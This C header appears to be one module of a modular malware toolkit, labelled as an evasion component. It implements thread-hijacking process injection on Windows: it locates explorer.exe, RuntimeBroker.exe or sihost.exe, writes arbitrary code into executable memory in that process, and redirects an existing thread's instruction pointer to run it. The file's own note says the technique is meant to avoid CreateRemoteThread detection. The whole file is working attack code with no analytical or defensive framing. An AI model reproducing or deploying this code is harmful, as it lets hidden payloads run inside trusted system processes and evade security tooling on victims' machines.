// chunk: evasion/thread_hijack
// depends: (none)
// provides: hijack_thread
// headers: windows.h
// risk: medium
// note: Thread hijacking — suspends an existing thread in a remote process, redirects its instruction pointer to injected code, resumes. No new thread creation — reuses existing thread, avoiding CreateRemoteThread detection.

#ifndef CHUNK_THREAD_HIJACK
#define CHUNK_THREAD_HIJACK

#include <tlhelp32.h>

static DWORD th_find_thread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    DWORD tid = 0;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tid;
}

static DWORD th_find_target_pid(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    static const char *targets[] = {"explorer.exe", "RuntimeBroker.exe", "sihost.exe", NULL};

    if (Process32First(snap, &pe)) {
        do {
            for (int i = 0; targets[i]; i++) {
                if (_stricmp(pe.szExeFile, targets[i]) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            }
            if (pid) break;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static int hijack_thread(BYTE *code, DWORD code_size) {
    DWORD pid = th_find_target_pid();
    if (!pid) return 0;

    DWORD tid = th_find_thread(pid);
    if (!tid) return 0;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return 0;

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    if (!hThread) {
        CloseHandle(hProc);
        return 0;
    }

    // Allocate and write code
    LPVOID remote_buf = VirtualAllocEx(hProc, NULL, code_size + 256,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_buf) {
        CloseHandle(hThread);
        CloseHandle(hProc);
        return 0;
    }

    SIZE_T written;
    WriteProcessMemory(hProc, remote_buf, code, code_size, &written);

    // Suspend thread and get context
    SuspendThread(hThread);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    // Save original RIP and redirect
#ifdef _WIN64
    ctx.Rip = (DWORD64)remote_buf;
#else
    ctx.Eip = (DWORD)remote_buf;
#endif

    SetThreadContext(hThread, &ctx);

    // Change protection
    DWORD old;
    VirtualProtectEx(hProc, remote_buf, code_size, PAGE_EXECUTE_READ, &old);

    // Resume
    ResumeThread(hThread);

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 1;
}

#endif
